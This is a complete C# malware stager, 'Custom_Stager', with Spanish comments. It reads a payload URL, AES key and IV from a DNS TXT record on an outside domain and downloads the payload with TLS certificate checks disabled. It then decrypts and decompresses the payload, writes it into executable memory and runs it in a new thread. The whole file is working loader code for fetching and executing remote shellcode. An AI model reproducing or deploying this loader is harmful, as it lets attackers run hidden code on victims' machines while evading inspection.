using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using DnsClient; 

namespace Custom_Stager
{
    class Program
    {
        private static string url;
        private static string AESKey;
        private static string AESIV;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // Método para obtener los datos del registro TXT usando DnsClient.NET
        private static void GetDNSData()
        {
            try
            {
                // Crear un cliente DNS para realizar la consulta
                var lookup = new LookupClient();

                // Realizar la consulta al registro TXT del dominio "data.administrative.cc"
                var result = lookup.Query("data.administrative.cc", QueryType.TXT);
                var txtRecords = result.Answers.TxtRecords().FirstOrDefault();

                if (txtRecords != null)
                {
                    // Asumimos que el registro TXT tiene 3 partes: URL, Key y IV
                    var txtData = txtRecords.Text.ToArray();

                    if (txtData.Length >= 3)
                    {
                        url = txtData[0];   // Primera parte es la URL
                        AESKey = txtData[1]; // Segunda parte es la clave AES
                        AESIV = txtData[2];  // Tercera parte es el IV
                    }
                    else
                    {
                        Console.WriteLine("Error: El registro TXT no contiene suficientes datos.");
                    }
                }
                else
                {
                    Console.WriteLine("Error: No se encontraron registros TXT.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error retrieving DNS data: " + ex.Message);
            }
        }

        private static byte[] AESDecrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                using (MemoryStream decryptedStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(decryptedStream);
                    return decryptedStream.ToArray();
                }
            }
        }

        public static byte[] Decompress(byte[] input)
        {
            using (MemoryStream tmpMs = new MemoryStream())
            using (MemoryStream ms = new MemoryStream(input))
            using (GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true))
            {
                zip.CopyTo(tmpMs);
                return tmpMs.ToArray();
            }
        }

        public static byte[] Download(string url)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                WebClient client = new WebClient();
                return client.DownloadData(url);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error during download: " + ex.Message);
                return null;
            }
        }

        public static void Execute(byte[] code)
        {
            if (code.Length <= 16)
            {
                Console.WriteLine("The code length is insufficient.");
                return;
            }

            byte[] encrypted = code.Skip(16).ToArray();
            byte[] decrypted;
            try
            {
                decrypted = AESDecrypt(encrypted, AESKey, AESIV);
            }
            catch
            {
                Console.WriteLine("Error during decryption.");
                return;
            }

            byte[] decompressed;
            try
            {
                decompressed = Decompress(decrypted);
            }
            catch
            {
                Console.WriteLine("Error during decompression.");
                return;
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Error during memory allocation.");
                return;
            }

            Marshal.Copy(decompressed, 0, addr, decompressed.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void Main(String[] args)
        {
            // Llamar al método para obtener los datos del registro DNS TXT
            GetDNSData();

            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(AESKey) && !string.IsNullOrEmpty(AESIV))
            {
                byte[] output = Download(url);
                if (output != null && output.Length > 0)
                {
                    Execute(output);
                }
                else
                {
                    Console.WriteLine("Error retrieving payload.");
                }
            }
            else
            {
                Console.WriteLine("Error: Could not retrieve URL/Key/IV from DNS.");
            }
        }
    }
}
